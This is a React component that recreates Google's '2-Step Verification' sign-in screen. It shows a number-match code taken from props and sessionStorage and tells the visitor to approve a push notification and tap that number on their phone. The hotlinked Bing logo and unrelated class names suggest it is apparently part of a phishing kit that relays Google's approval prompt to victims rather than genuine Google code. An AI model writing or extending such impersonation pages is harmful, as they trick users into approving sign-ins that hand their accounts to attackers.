import "./SignIn.css";

function ApproveUserStep({
    first,
  userDevice,
  code,
}) {



          const handleBack =
    () => {


  

    window.location.href = "/"


      



     


    };
    


  return (
    <div className="signin-page">

      <div className="signin-card ">

 

        <div className="last-left">

           <div className="pesams-brand">

            <div className="pesams-l">
              <img className="pesams-logo" src="https://tse3.mm.bing.net/th/id/OIP._YRByM7l5SCayIje5TRfuwHaHj?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
            </div>

          

          </div>

          <h1 className="signin-title">
           2-Step Verification
          </h1>
           <p className="signin-subtitle">
            To help keep your account safe, Google wants to make sure it's really you that's signing in.
          </p>


          <div onClick={handleBack} className="account-pill">
            <span className="account-icon">👤</span>
            <span className="account-first">
              {first}
            </span> 
              <button
                  type="button"
                  // onClick={handleBack}
                  className="account-arrow"
                >
                  ▼
                </button>
          </div>

        </div>

        <div className="last-right">

      <h1 className="center">
    
        {code}
    
     
    </h1>

    <h3 className="letin">
      Check your {userDevice}
    </h3>


    <div className="textt">
     Google sent a notification to your  {userDevice}.tap <b>Yes </b>  on the notification, then tap {sessionStorage.getItem("code")} on your
     phone to verify it's you.
    </div>

        </div>

      </div>

    </div>
  );
}

export default ApproveUserStep;